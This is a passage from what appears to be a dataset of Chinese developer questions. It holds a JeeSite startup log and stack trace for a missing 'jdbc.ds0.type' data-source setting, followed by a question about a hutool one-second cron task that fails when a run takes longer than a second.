3.3.jar;C:\MySoftware\apache-maven-3.8.1\repository\jakarta\activation\jakarta.activation-api\1.2.2\jakarta.activation-api-1.2.2.jar;C:\MySoftware\apache-maven-3.8.1\repository\org\codehaus\woodstox\stax2-api\4.2.1\stax2-api-4.2.1.jar;C:\MySoftware\apache-maven-3.8.1\repository\com\fasterxml\woodstox\woodstox-core\6.2.4\woodstox-core-6.2.4.jar;C:\MySoftware\apache-maven-3.8.1\repository\com\alibaba\fastjson\1.2.78\fastjson-1.2.78.jar;C:\MySoftware\apache-maven-3.8.1\repository\jaxen\jaxen\1.2.0\jaxen-1.2.0.jar;C:\MySoftware\apache-maven-3.8.1\repository\org\yaml\snakeyaml\1.28\snakeyaml-1.28.jar;C:\MySoftware\apache-maven-3.8.1\repository\org\apache\httpcomponents\httpclient\4.5.13\httpclient-4.5.13.jar;C:\MySoftware\apache-maven-3.8.1\repository\org\apache\httpcomponents\httpcore\4.4.15\httpcore-4.4.15.jar;C:\MySoftware\apache-maven-3.8.1\repository\org\apache\commons\commons-email\1.5\commons-email-1.5.jar;C:\MySoftware\apache-maven-3.8.1\repository\com\sun\mail\javax.mail\1.5.6\javax.mail-1.5.6.jar;C:\MySoftware\apache-maven-3.8.1\repository\javax\activation\activation\1.1\activation-1.1.jar;C:\MySoftware\apache-maven-3.8.1\repository\eu\bitwalker\UserAgentUtils\1.21\UserAgentUtils-1.21.jar;C:\MySoftware\apache-maven-3.8.1\repository\net\coobird\thumbnailator\0.4.14\thumbnailator-0.4.14.jar;C:\MySoftware\apache-maven-3.8.1\repository\com\twelvemonkeys\imageio\imageio-jpeg\3.7.0\imageio-jpeg-3.7.0.jar;C:\MySoftware\apache-maven-3.8.1\repository\com\twelvemonkeys\imageio\imageio-core\3.7.0\imageio-core-3.7.0.jar;C:\MySoftware\apache-maven-3.8.1\repository\com\twelvemonkeys\imageio\imageio-metadata\3.7.0\imageio-metadata-3.7.0.jar;C:\MySoftware\apache-maven-3.8.1\repository\com\twelvemonkeys\common\common-lang\3.7.0\common-lang-3.7.0.jar;C:\MySoftware\apache-maven-3.8.1\repository\com\twelvemonkeys\common\common-io\3.7.0\common-io-3.7.0.jar;C:\MySoftware\apache-maven-3.8.1\repository\com\twelvemonkeys\common\common-image\3.7.0\common-image-3.7.0.jar;C:\MySoftware\apache-maven-3.8.1\repository\com\bladejava\blade-patchca\1.1.2\blade-patchca-1.1.2.jar;C:\MySoftware\apache-maven-3.8.1\repository\org\projectlombok\lombok\1.18.22\lombok-1.18.22.jar;C:\MySoftware\apache-maven-3.8.1\repository\net\sf\jmimemagic\jmimemagic\0.1.5\jmimemagic-0.1.5.jar;C:\MySoftware\apache-maven-3.8.1\repository\com\google\zxing\core\3.4.1\core-3.4.1.jar;C:\MySoftware\apache-maven-3.8.1\repository\com\google\zxing\javase\3.4.1\javase-3.4.1.jar;C:\MySoftware\apache-maven-3.8.1\repository\com\beust\jcommander\1.78\jcommander-1.78.jar;C:\MySoftware\apache-maven-3.8.1\repository\com\github\jai-imageio\jai-imageio-core\1.4.0\jai-imageio-core-1.4.0.jar;C:\MySoftware\apache-maven-3.8.1\repository\org\apache\poi\poi\4.1.2\poi-4.1.2.jar;C:\MySoftware\apache-maven-3.8.1\repository\org\apache\commons\commons-collections4\4.4\commons-collections4-4.4.jar;C:\MySoftware\apache-maven-3.8.1\repository\org\apache\commons\commons-math3\3.6.1\commons-math3-3.6.1.jar;C:\MySoftware\apache-maven-3.8.1\repository\com\zaxxer\SparseBitSet\1.2\SparseBitSet-1.2.jar;C:\MySoftware\apache-maven-3.8.1\repository\org\apache\poi\poi-ooxml\4.1.2\poi-ooxml-4.1.2.jar;C:\MySoftware\apache-maven-3.8.1\repository\org\apache\commons\commons-compress\1.19\commons-compress-1.19.jar;C:\MySoftware\apache-maven-3.8.1\repository\com\github\virtuald\curvesapi\1.06\curvesapi-1.06.jar;C:\MySoftware\apache-maven-3.8.1\repository\org\apache\poi\poi-ooxml-schemas\4.1.2\poi-ooxml-schemas-4.1.2.jar;C:\MySoftware\apache-maven-3.8.1\repository\org\apache\xmlbeans\xmlbeans\3.1.0\xmlbeans-3.1.0.jar;C:\MySoftware\apache-maven-3.8.1\repository\org\apache\poi\poi-scratchpad\4.1.2\poi-scratchpad-4.1.2.jar;C:\MySoftware\apache-maven-3.8.1\repository\com\belerweb\pinyin4j\2.5.1\pinyin4j-2.5.1.jar;C:\MySoftware\apache-maven-3.8.1\repository\org\slf4j\slf4j-api\1.7.33\slf4j-api-1.7.33.jar;C:\MySoftware\apache-maven-3.8.1\repository\org\slf4j\jcl-over-slf4j\1.7.33\jcl-over-slf4j-1.7.33.jar;C:\MySoftware\apache-maven-3.8.1\repository\org\slf4j\jul-to-slf4j\1.7.33\jul-to-slf4j-1.7.33.jar;C:\MySoftware\apache-maven-3.8.1\repository\org\slf4j\log4j-over-slf4j\1.7.33\log4j-over-slf4j-1.7.33.jar;C:\MySoftware\apache-maven-3.8.1\repository\ch\qos\logback\logback-classic\1.2.10\logback-classic-1.2.10.jar;C:\MySoftware\apache-maven-3.8.1\repository\ch\qos\logback\logback-core\1.2.10\logback-core-1.2.10.jar;C:\MySoftware\apache-maven-3.8.1\repository\org\springframework\spring-beans\5.3.15\spring-beans-5.3.15.jar;C:\MySoftware\apache-maven-3.8.1\repository\org\springframework\spring-core\5.3.15\spring-core-5.3.15.jar;C:\MySoftware\apache-maven-3.8.1\repository\org\springframework\spring-jcl\5.3.15\spring-jcl-5.3.15.jar;C:\MySoftware\apache-maven-3.8.1\repository\junit\junit\4.13.2\junit-4.13.2.jar;C:\MySoftware\apache-maven-3.8.1\repository\org\hamcrest\hamcrest-core\2.2\hamcrest-core-2.2.jar;C:\MySoftware\apache-maven-3.8.1\repository\org\hamcrest\hamcrest\2.2\hamcrest-2.2.jar;C:\MySoftware\apache-maven-3.8.1\repository\org\springframework\spring-test\5.3.15\spring-test-5.3.15.jar;C:\MySoftware\apache-maven-3.8.1\repository\com\jeesite\jeesite-framework\4.3.3-SNAPSHOT\jeesite-framework-4.3.3-SNAPSHOT.jar;C:\MySoftware\apache-maven-3.8.1\repository\com\alibaba\druid\1.2.8\druid-1.2.8.jar;C:\MySoftware\apache-maven-3.8.1\repository\org\springframework\spring-jdbc\5.3.15\spring-jdbc-5.3.15.jar;C:\MySoftware\apache-maven-3.8.1\repository\org\springframework\spring-tx\5.3.15\spring-tx-5.3.15.jar;C:\MySoftware\apache-maven-3.8.1\repository\org\springframework\boot\spring-boot-starter-jta-atomikos\2.5.9\spring-boot-starter-jta-atomikos-2.5.9.jar;C:\MySoftware\apache-maven-3.8.1\repository\org\springframework\boot\spring-boot-starter\2.5.9\spring-boot-starter-2.5.9.jar;C:\MySoftware\apache-maven-3.8.1\repository\org\springframework\boot\spring-boot-autoconfigure\2.5.9\spring-boot-autoconfigure-2.5.9.jar;C:\MySoftware\apache-maven-3.8.1\repository\org\springframework\boot\spring-boot-starter-logging\2.5.9\spring-boot-starter-logging-2.5.9.jar;C:\MySoftware\apache-maven-3.8.1\repository\org\apache\logging\log4j\log4j-to-slf4j\2.17.1\log4j-to-slf4j-2.17.1.jar;C:\MySoftware\apache-maven-3.8.1\repository\org\apache\logging\log4j\log4j-api\2.17.1\log4j-api-2.17.1.jar;C:\MySoftware\apache-maven-3.8.1\repository\jakarta\annotation\jakarta.annotation-api\1.3.5\jakarta.annotation-api-1.3.5.jar;C:\MySoftware\apache-maven-3.8.1\repository\com\atomikos\transactions-jms\4.0.6\transactions-jms-4.0.6.jar;C:\MySoftware\apache-maven-3.8.1\repository\com\atomikos\transactions-jta\4.0.6\transactions-jta-4.0.6.jar;C:\MySoftware\apache-maven-3.8.1\repository\com\atomikos\transactions-api\4.0.6\transactions-api-4.0.6.jar;C:\MySoftware\apache-maven-3.8.1\repository\com\atomikos\transactions\4.0.6\transactions-4.0.6.jar;C:\MySoftware\apache-maven-3.8.1\repository\com\atomikos\atomikos-util\4.0.6\atomikos-util-4.0.6.jar;C:\MySoftware\apache-maven-3.8.1\repository\com\atomikos\transactions-jdbc\4.0.6\transactions-jdbc-4.0.6.jar;C:\MySoftware\apache-maven-3.8.1\repository\jakarta\transaction\jakarta.transaction-api\1.3.3\jakarta.transaction-api-1.3.3.jar;C:\MySoftware\apache-maven-3.8.1\repository\org\springframework\boot\spring-boot-starter-aop\2.5.9\spring-boot-starter-aop-2.5.9.jar;C:\MySoftware\apache-maven-3.8.1\repository\org\springframework\spring-aop\5.3.15\spring-aop-5.3.15.jar;C:\MySoftware\apache-maven-3.8.1\repository\org\aspectj\aspectjweaver\1.9.7\aspectjweaver-1.9.7.jar;C:\MySoftware\apache-maven-3.8.1\repository\org\mybatis\mybatis\3.5.9\mybatis-3.5.9.jar;C:\MySoftware\apache-maven-3.8.1\repository\org\mybatis\mybatis-spring\2.0.6\mybatis-spring-2.0.6.jar;C:\MySoftware\apache-maven-3.8.1\repository\com\github\jsqlparser\jsqlparser\4.3\jsqlparser-4.3.jar;C:\MySoftware\apache-maven-3.8.1\repository\org\apache\shiro\shiro-core\1.8.0\shiro-core-1.8.0.jar;C:\MySoftware\apache-maven-3.8.1\repository\org\apache\shiro\shiro-lang\1.8.0\shiro-lang-1.8.0.jar;C:\MySoftware\apache-maven-3.8.1\repository\org\apache\shiro\shiro-cache\1.8.0\shiro-cache-1.8.0.jar;C:\MySoftware\apache-maven-3.8.1\repository\org\apache\shiro\shiro-crypto-hash\1.8.0\shiro-crypto-hash-1.8.0.jar;C:\MySoftware\apache-maven-3.8.1\repository\org\apache\shiro\shiro-crypto-core\1.8.0\shiro-crypto-core-1.8.0.jar;C:\MySoftware\apache-maven-3.8.1\repository\org\apache\shiro\shiro-crypto-cipher\1.8.0\shiro-crypto-cipher-1.8.0.jar;C:\MySoftware\apache-maven-3.8.1\repository\org\apache\shiro\shiro-config-core\1.8.0\shiro-config-core-1.8.0.jar;C:\MySoftware\apache-maven-3.8.1\repository\org\apache\shiro\shiro-config-ogdl\1.8.0\shiro-config-ogdl-1.8.0.jar;C:\MySoftware\apache-maven-3.8.1\repository\org\apache\shiro\shiro-event\1.8.0\shiro-event-1.8.0.jar;C:\MySoftware\apache-maven-3.8.1\repository\org\apache\shiro\shiro-spring\1.8.0\shiro-spring-1.8.0.jar;C:\MySoftware\apache-maven-3.8.1\repository\org\apache\shiro\shiro-cas\1.8.0\shiro-cas-1.8.0.jar;C:\MySoftware\apache-maven-3.8.1\repository\org\jasig\cas\client\cas-client-core\3.2.2\cas-client-core-3.2.2.jar;C:\MySoftware\apache-maven-3.8.1\repository\org\apache\shiro\shiro-web\1.8.0\shiro-web-1.8.0.jar;C:\MySoftware\apache-maven-3.8.1\repository\org\owasp\encoder\encoder\1.2.2\encoder-1.2.2.jar;C:\MySoftware\apache-maven-3.8.1\repository\org\apache\commons\commons-pool2\2.9.0\commons-pool2-2.9.0.jar;C:\MySoftware\apache-maven-3.8.1\repository\net\oschina\j2cache\j2cache-core\2.8.0-release\j2cache-core-2.8.0-release.jar;C:\MySoftware\apache-maven-3.8.1\repository\com\github\ben-manes\caffeine\caffeine\2.9.3\caffeine-2.9.3.jar;C:\MySoftware\apache-maven-3.8.1\repository\com\google\errorprone\error_prone_annotations\2.10.0\error_prone_annotations-2.10.0.jar;C:\MySoftware\apache-maven-3.8.1\repository\jline\jline\2.14.2\jline-2.14.2.jar;C:\MySoftware\apache-maven-3.8.1\repository\org\springframework\boot\spring-boot-starter-cache\2.5.9\spring-boot-starter-cache-2.5.9.jar;C:\MySoftware\apache-maven-3.8.1\repository\org\springframework\spring-context-support\5.3.15\spring-context-support-5.3.15.jar;C:\MySoftware\apache-maven-3.8.1\repository\org\springframework\boot\spring-boot-starter-data-redis\2.5.9\spring-boot-starter-data-redis-2.5.9.jar;C:\MySoftware\apache-maven-3.8.1\repository\org\springframework\data\spring-data-redis\2.5.8\spring-data-redis-2.5.8.jar;C:\MySoftware\apache-maven-3.8.1\repository\org\springframework\data\spring-data-keyvalue\2.5.8\spring-data-keyvalue-2.5.8.jar;C:\MySoftware\apache-maven-3.8.1\repository\org\springframework\data\spring-data-commons\2.5.8\spring-data-commons-2.5.8.jar;C:\MySoftware\apache-maven-3.8.1\repository\org\springframework\spring-oxm\5.3.15\spring-oxm-5.3.15.jar;C:\MySoftware\apache-maven-3.8.1\repository\io\lettuce\lettuce-core\6.1.6.RELEASE\lettuce-core-6.1.6.RELEASE.jar;C:\MySoftware\apache-maven-3.8.1\repository\io\netty\netty-common\4.1.73.Final\netty-common-4.1.73.Final.jar;C:\MySoftware\apache-maven-3.8.1\repository\io\netty\netty-handler\4.1.73.Final\netty-handler-4.1.73.Final.jar;C:\MySoftware\apache-maven-3.8.1\repository\io\netty\netty-resolver\4.1.73.Final\netty-resolver-4.1.73.Final.jar;C:\MySoftware\apache-maven-3.8.1\repository\io\netty\netty-buffer\4.1.73.Final\netty-buffer-4.1.73.Final.jar;C:\MySoftware\apache-maven-3.8.1\repository\io\netty\netty-codec\4.1.73.Final\netty-codec-4.1.73.Final.jar;C:\MySoftware\apache-maven-3.8.1\repository\io\netty\netty-tcnative-classes\2.0.46.Final\netty-tcnative-classes-2.0.46.Final.jar;C:\MySoftware\apache-maven-3.8.1\repository\io\netty\netty-transport\4.1.73.Final\netty-transport-4.1.73.Final.jar;C:\MySoftware\apache-maven-3.8.1\repository\io\projectreactor\reactor-core\3.4.14\reactor-core-3.4.14.jar;C:\MySoftware\apache-maven-3.8.1\repository\org\reactivestreams\reactive-streams\1.0.3\reactive-streams-1.0.3.jar;C:\MySoftware\apache-maven-3.8.1\repository\org\springframework\boot\spring-boot-test\2.5.9\spring-boot-test-2.5.9.jar;C:\MySoftware\apache-maven-3.8.1\repository\org\springframework\boot\spring-boot\2.5.9\spring-boot-2.5.9.jar;C:\MySoftware\apache-maven-3.8.1\repository\org\springframework\boot\spring-boot-starter-web\2.5.9\spring-boot-starter-web-2.5.9.jar;C:\MySoftware\apache-maven-3.8.1\repository\org\springframework\boot\spring-boot-starter-json\2.5.9\spring-boot-starter-json-2.5.9.jar;C:\MySoftware\apache-maven-3.8.1\repository\com\fasterxml\jackson\datatype\jackson-datatype-jdk8\2.12.6\jackson-datatype-jdk8-2.12.6.jar;C:\MySoftware\apache-maven-3.8.1\repository\com\fasterxml\jackson\datatype\jackson-datatype-jsr310\2.12.6\jackson-datatype-jsr310-2.12.6.jar;C:\MySoftware\apache-maven-3.8.1\repository\com\fasterxml\jackson\module\jackson-module-parameter-names\2.12.6\jackson-module-parameter-names-2.12.6.jar;C:\MySoftware\apache-maven-3.8.1\repository\org\springframework\boot\spring-boot-starter-tomcat\2.5.9\spring-boot-starter-tomcat-2.5.9.jar;C:\MySoftware\apache-maven-3.8.1\repository\org\apache\tomcat\embed\tomcat-embed-core\9.0.58\tomcat-embed-core-9.0.58.jar;C:\MySoftware\apache-maven-3.8.1\repository\org\apache\tomcat\embed\tomcat-embed-websocket\9.0.58\tomcat-embed-websocket-9.0.58.jar;C:\MySoftware\apache-maven-3.8.1\repository\org\springframework\spring-web\5.3.15\spring-web-5.3.15.jar;C:\MySoftware\apache-maven-3.8.1\repository\org\springframework\spring-webmvc\5.3.15\spring-webmvc-5.3.15.jar;C:\MySoftware\apache-maven-3.8.1\repository\org\springframework\spring-expression\5.3.15\spring-expression-5.3.15.jar;C:\MySoftware\apache-maven-3.8.1\repository\org\springframework\boot\spring-boot-starter-validation\2.5.9\spring-boot-starter-validation-2.5.9.jar;C:\MySoftware\apache-maven-3.8.1\repository\org\apache\tomcat\embed\tomcat-embed-el\9.0.58\tomcat-embed-el-9.0.58.jar;C:\MySoftware\apache-maven-3.8.1\repository\org\hibernate\validator\hibernate-validator\6.2.0.Final\hibernate-validator-6.2.0.Final.jar;C:\MySoftware\apache-maven-3.8.1\repository\jakarta\validation\jakarta.validation-api\2.0.2\jakarta.validation-api-2.0.2.jar;C:\MySoftware\apache-maven-3.8.1\repository\org\jboss\logging\jboss-logging\3.4.3.Final\jboss-logging-3.4.3.Final.jar;C:\MySoftware\apache-maven-3.8.1\repository\com\jeesite\beetl\3.3-SNAPSHOT\beetl-3.3-SNAPSHOT.jar;C:\MySoftware\apache-maven-3.8.1\repository\org\antlr\antlr4-runtime\4.7.2\antlr4-runtime-4.7.2.jar;C:\MySoftware\apache-maven-3.8.1\repository\org\quartz-scheduler\quartz\2.3.2\quartz-2.3.2.jar;C:\MySoftware\apache-maven-3.8.1\repository\com\mchange\mchange-commons-java\0.2.15\mchange-commons-java-0.2.15.jar;C:\MySoftware\apache-maven-3.8.1\repository\com\jeesite\jeesite-module-swagger\4.3.3-SNAPSHOT\jeesite-module-swagger-4.3.3-SNAPSHOT.jar;C:\MySoftware\apache-maven-3.8.1\repository\io\swagger\swagger-annotations\1.6.0\swagger-annotations-1.6.0.jar;C:\MySoftware\apache-maven-3.8.1\repository\io\swagger\swagger-models\1.6.0\swagger-models-1.6.0.jar;C:\MySoftware\apache-maven-3.8.1\repository\com\fasterxml\jackson\core\jackson-annotations\2.12.6\jackson-annotations-2.12.6.jar;C:\MySoftware\apache-maven-3.8.1\repository\io\springfox\springfox-swagger2\2.10.5\springfox-swagger2-2.10.5.jar;C:\MySoftware\apache-maven-3.8.1\repository\io\springfox\springfox-spi\2.10.5\springfox-spi-2.10.5.jar;C:\MySoftware\apache-maven-3.8.1\repository\io\springfox\springfox-core\2.10.5\springfox-core-2.10.5.jar;C:\MySoftware\apache-maven-3.8.1\repository\net\bytebuddy\byte-buddy\1.10.22\byte-buddy-1.10.22.jar;C:\MySoftware\apache-maven-3.8.1\repository\io\springfox\springfox-schema\2.10.5\springfox-schema-2.10.5.jar;C:\MySoftware\apache-maven-3.8.1\repository\io\springfox\springfox-swagger-common\2.10.5\springfox-swagger-common-2.10.5.jar;C:\MySoftware\apache-maven-3.8.1\repository\io\springfox\springfox-spring-web\2.10.5\springfox-spring-web-2.10.5.jar;C:\MySoftware\apache-maven-3.8.1\repository\io\github\classgraph\classgraph\4.1.7\classgraph-4.1.7.jar;C:\MySoftware\apache-maven-3.8.1\repository\com\fasterxml\classmate\1.5.1\classmate-1.5.1.jar;C:\MySoftware\apache-maven-3.8.1\repository\org\springframework\plugin\spring-plugin-core\2.0.0.RELEASE\spring-plugin-core-2.0.0.RELEASE.jar;C:\MySoftware\apache-maven-3.8.1\repository\org\springframework\spring-context\5.3.15\spring-context-5.3.15.jar;C:\MySoftware\apache-maven-3.8.1\repository\org\springframework\plugin\spring-plugin-metadata\2.0.0.RELEASE\spring-plugin-metadata-2.0.0.RELEASE.jar;C:\MySoftware\apache-maven-3.8.1\repository\org\mapstruct\mapstruct\1.3.1.Final\mapstruct-1.3.1.Final.jar;C:\MySoftware\apache-maven-3.8.1\repository\io\springfox\springfox-spring-webmvc\2.10.5\springfox-spring-webmvc-2.10.5.jar;C:\MySoftware\apache-maven-3.8.1\repository\io\springfox\springfox-bean-validators\2.10.5\springfox-bean-validators-2.10.5.jar;C:\MySoftware\apache-maven-3.8.1\repository\com\github\xiaoymin\knife4j-spring-ui\2.0.9\knife4j-spring-ui-2.0.9.jar;C:\MySoftware\apache-maven-3.8.1\repository\javax\servlet\javax.servlet-api\4.0.1\javax.servlet-api-4.0.1.jar;C:\Program Files\JetBrains\IntelliJ IDEA 2021.2.2\lib\idea_rt.jar"" com.jeesite.modules.Application Connected to the target VM, address: '127.0.0.1:9975', transport: 'socket' 02-25 22:57:20.239 INFO [com.jeesite.modules.Application ] - Starting Application using Java 1.8.0_201 on LAPTOP-U44OIEEI with PID 4316 (C:\MyFiles\JavaCode\GitCode\jeesite4\web\src\main\webapp\WEB-INF\classes started by ya_jun in C:\MyFiles\JavaCode\GitCode\jeesite4) 02-25 22:57:20.242 DEBUG [com.jeesite.modules.Application ] - Running with Spring Boot v2.5.9, Spring v5.3.15 02-25 22:57:20.242 INFO [com.jeesite.modules.Application ] - The following profiles are active: default 02-25 22:57:21.749 INFO [com.jeesite.common.config.Global ] - Config files: [classpath:config/jeesite-core.yml, classpath:config/application.yml] 02-25 22:57:21.750 INFO [com.jeesite.common.config.Global ] - Spring cache cluster mode: false, session manager name: J1CacheSession 02-25 22:57:22.765 INFO [com.jeesite.common.config.Global ] - user.home: C:/Users/ya_jun 02-25 22:57:22.766 INFO [com.jeesite.common.config.Global ] - user.dir: C:/MyFiles/JavaCode/GitCode/jeesite4 02-25 22:57:22.766 INFO [com.jeesite.common.config.Global ] - logPath: C:/MyFiles/JavaCode/GitCode/jeesite4/web/src/main/webapp/WEB-INF/classes _____ ___ _ _ ___ |_ _| / __'(_)_| |_ / | _ | | __ __ \___ | |_ _| __ / /| | ( .| |/__\/__\ ___)| | | |_ /__\ / /_| |_ \___|\__.\__.|____|_| \___)\__.(____ _| :: JeeSite V4.3.3 :: ======================================|_|========================== 欢迎使用 JeeSite Demo V4.3 您当前的版本为JeeSite社区版，官方网站：http://jeesite.com 授权机器码是：bbc43a7cac682c1e270d070e5aee858d 授权产品名称：JeeSite Demo 授权公司名称：ThinkGem =================================================================== 02-25 22:57:23.335 INFO [o.s.b.w.embedded.tomcat.TomcatWebServer] - Tomcat initialized with port(s): 8980 (http) 02-25 22:57:23.422 DEBUG [c.j.common.datasource.RoutingDataSource] - Set default data source success. 02-25 22:57:23.853 INFO [c.jeesite.common.mybatis.MapperRefresh ] - Mybatis mapper refresh, start in 60 seconds. 02-25 22:57:23.916 DEBUG [o.m.s.t.SpringManagedTransaction ] - JDBC Connection [com.alibaba.druid.proxy.jdbc.ConnectionProxyImpl@75b8daa8] will not be managed by Spring 02-25 22:57:24.433 DEBUG [c.j.m.g.d.GenDataDictDao.findTableList ] - ==&gt; Preparing: SELECT t.TABLE_NAME AS ""tableName"", t.TABLE_COMMENT AS ""comments"" FROM information_schema.TABLES t WHERE t.TABLE_SCHEMA = (select database()) UNION ALL SELECT t.TABLE_NAME AS ""tableName"", t.VIEW_DEFINITION AS ""comments"" FROM information_schema.VIEWS t WHERE t.TABLE_SCHEMA = (select database()) ORDER BY ""tableName"" 02-25 22:57:24.450 DEBUG [c.j.m.g.d.GenDataDictDao.findTableList ] - ==&gt; Parameters: 02-25 22:57:24.469 DEBUG [c.j.m.g.d.GenDataDictDao.findTableList ] - &lt;== Total: 48 02-25 22:57:27.408 DEBUG [c.j.c.m.m.provider.SelectSqlProvider ] - 3毫秒: SELECT a.`status` AS ""status"", a.`create_by` AS ""createBy"", a.`create_date` AS ""createDate"", a.`update_by` AS ""updateBy"", a.`update_date` AS ""updateDate"", a.`remarks` AS ""remarks"", a.`module_code` AS ""moduleCode"", a.`module_name` AS ""moduleName"", a.`description` AS ""description"", a.`main_class_name` AS ""mainClassName"", a.`current_version` AS ""currentVersion"", a.`upgrade_info` AS ""upgradeInfo"" FROM `js_sys_module` a WHERE a.`status` = #{sqlMap.where#status#EQ1} ORDER BY a.update_date DESC 02-25 22:57:27.410 DEBUG [o.m.s.t.SpringManagedTransaction ] - JDBC Connection [com.alibaba.druid.proxy.jdbc.ConnectionProxyImpl@75b8daa8] will be managed by Spring 02-25 22:57:27.410 DEBUG [c.j.modules.sys.dao.ModuleDao.findList ] - ==&gt; Preparing: SELECT a.`status` AS ""status"", a.`create_by` AS ""createBy"", a.`create_date` AS ""createDate"", a.`update_by` AS ""updateBy"", a.`update_date` AS ""updateDate"", a.`remarks` AS ""remarks"", a.`module_code` AS ""moduleCode"", a.`module_name` AS ""moduleName"", a.`description` AS ""description"", a.`main_class_name` AS ""mainClassName"", a.`current_version` AS ""currentVersion"", a.`upgrade_info` AS ""upgradeInfo"" FROM `js_sys_module` a WHERE a.`status` = ? ORDER BY a.update_date DESC 02-25 22:57:27.411 DEBUG [c.j.modules.sys.dao.ModuleDao.findList ] - ==&gt; Parameters: 0(String) 02-25 22:57:27.417 DEBUG [c.j.modules.sys.dao.ModuleDao.findList ] - &lt;== Total: 9 02-25 22:57:27.433 INFO [o.s.b.w.embedded.tomcat.TomcatWebServer] - Tomcat started on port(s): 8980 (http) with context path '/js' 02-25 22:57:28.406 INFO [com.jeesite.modules.Application ] - Started Application in 8.736 seconds (JVM running for 9.548) 02-25 22:57:28.408 DEBUG [c.j.common.datasource.RoutingDataSource] - Add data source success: ds0 02-25 22:58:39.117 DEBUG [c.j.m.sys.interceptor.LogInterceptor ] - 开始计时: 10:58:39.116 URI: /js/a/test/testData/listData IP: 0:0:0:0:0:0:0:1 [ds0] 02-25 22:58:41.466 DEBUG [c.j.c.m.m.provider.SelectSqlProvider ] - 3毫秒: SELECT a.id AS ""id"", a.test_input AS ""testInput"", a.test_textarea AS ""testTextarea"", a.test_select AS ""testSelect"", a.test_select_multiple AS ""testSelectMultiple"", a.test_radio AS ""testRadio"", a.test_checkbox AS ""testCheckbox"", a.test_date AS ""testDate"", a.test_datetime AS ""testDatetime"", a.test_user_code AS ""testUser.userCode"", a.test_office_code AS ""testOffice.officeCode"", a.test_area_code AS ""testAreaCode"", a.test_area_name AS ""testAreaName"", a.status AS ""status"", a.create_by AS ""createBy"", a.create_date AS ""createDate"", a.update_by AS ""updateBy"", a.update_date AS ""updateDate"", a.remarks AS ""remarks"", u10.user_name AS ""testUser.userName"", u11.office_name AS ""testOffice.officeName"" FROM test_data a LEFT JOIN js_sys_user u10 ON u10.user_code = a.test_user_code LEFT JOIN js_sys_office u11 ON u11.office_code = a.test_office_code WHERE a.status != #{STATUS_DELETE} ORDER BY a.update_date DESC 02-25 22:58:41.466 DEBUG [o.m.s.t.SpringManagedTransaction ] - JDBC Connection [com.alibaba.druid.proxy.jdbc.ConnectionProxyImpl@4e4a5f32] will be managed by Spring 02-25 22:58:41.471 DEBUG [c.j.m.sys.interceptor.LogInterceptor ] - 计时结束: 10:58:41.470 用时: 2秒 URI: /js/a/test/testData/listData 总内存: 699.5MB 已用内存: 382.735MB 02-25 22:58:41.472 ERROR [o.a.c.c.C.[.[.[/js].[dispatcherServlet]] - Servlet.service() for servlet [dispatcherServlet] in context with path [/js] threw exception [Request processing failed; nested exception is org.mybatis.spring.MyBatisSystemException: nested exception is org.apache.ibatis.exceptions.PersistenceException: ### Error querying database. Cause: com.jeesite.common.service.ServiceException: 没有找到 jdbc.ds0.type 的参数配置 ### The error may exist in com/jeesite/modules/test/dao/TestDataDao.java (best guess) ### The error may involve com.jeesite.modules.test.dao.TestDataDao.findList ### The error occurred while executing a query ### Cause: com.jeesite.common.service.ServiceException: 没有找到 jdbc.ds0.type 的参数配置] with root cause com.jeesite.common.service.ServiceException: 没有找到 jdbc.ds0.type 的参数配置 at com.jeesite.common.config.Global.getJdbcInfo(iha:342) at com.jeesite.common.config.Global.getJdbcType(iha:242) at com.jeesite.common.mybatis.interceptor.PaginationHelper.getDialect(paa:160) at com.jeesite.common.mybatis.interceptor.PaginationHelper.getCountSql(paa:42) at com.jeesite.common.mybatis.interceptor.PaginationHelper.short(paa:125) at com.jeesite.common.mybatis.interceptor.PaginationHelper.getTotalCount(paa:89) at com.jeesite.common.shiro.realms.IiiiiiiiIiiI.short(lea:50) at com.jeesite.common.shiro.realms.IiiiiiiiIiiI.byte(lea:67) at com.jeesite.common.mybatis.interceptor.PaginationInterceptor.intercept(yga:192) at org.apache.ibatis.plugin.Plugin.invoke(Plugin.java:62) at com.sun.proxy.$Proxy120.prepare(Unknown Source) at org.apache.ibatis.executor.SimpleExecutor.prepareStatement(SimpleExecutor.java:87) at org.apache.ibatis.executor.SimpleExecutor.doQuery(SimpleExecutor.java:62) at org.apache.ibatis.executor.BaseExecutor.queryFromDatabase(BaseExecutor.java:325) at org.apache.ibatis.executor.BaseExecutor.query(BaseExecutor.java:156) at org.apache.ibatis.executor.CachingExecutor.query(CachingExecutor.java:109) at org.apache.ibatis.executor.CachingExecutor.query(CachingExecutor.java:89) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:498) at org.apache.ibatis.plugin.Invocation.proceed(Invocation.java:49) at com.jeesite.common.mybatis.interceptor.IiiIIiiiiIIi.short(yea:96) at com.jeesite.common.mybatis.interceptor.IiiIIiiiiIIi.byte(yea:139) at com.jeesite.common.mybatis.interceptor.DataSourceInterceptor.intercept(yea:34) at org.apache.ibatis.plugin.Plugin.invoke(Plugin.java:62) at com.sun.proxy.$Proxy119.query(Unknown Source) at org.apache.ibatis.session.defaults.DefaultSqlSession.selectList(DefaultSqlSession.java:151) at org.apache.ibatis.session.defaults.DefaultSqlSession.selectList(DefaultSqlSession.java:145) at org.apache.ibatis.session.defaults.DefaultSqlSession.selectList(DefaultSqlSession.java:140) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl"
设置了了一个秒级的动态定时任务超时执行后报错怎么解决？,"设定了一个1秒级的定时任务，任务执行时间明显要超过1秒，执行时候报错了，我希望能执行多久就执行多久，执行完毕后再进行下一轮的执行。 JDK版本： openjdk_8_201 hutool版本： 5.3.10 Exception in thread ""hutool-cron-6"" Exception in thread ""hutool-cron-3"" Exception in thread ""hutool-cron-7""   <code>: String cronString=""0/1 * * * * ? ""; String scheduleId = CronUtil.schedule(cronString, new cn.hutool.cron.task.Task() { @Override public void execute() { List&lt;Long&gt; integers = new ArrayList&lt;&gt;(); for(long i=0;i&lt;100000000;i++) { integers.add(i); } System.out.println(""定时任务执行1秒执行一次""+new Date()+""""); } }); CronUtil.setMatchSecond(true); CronUtil.start(true);"
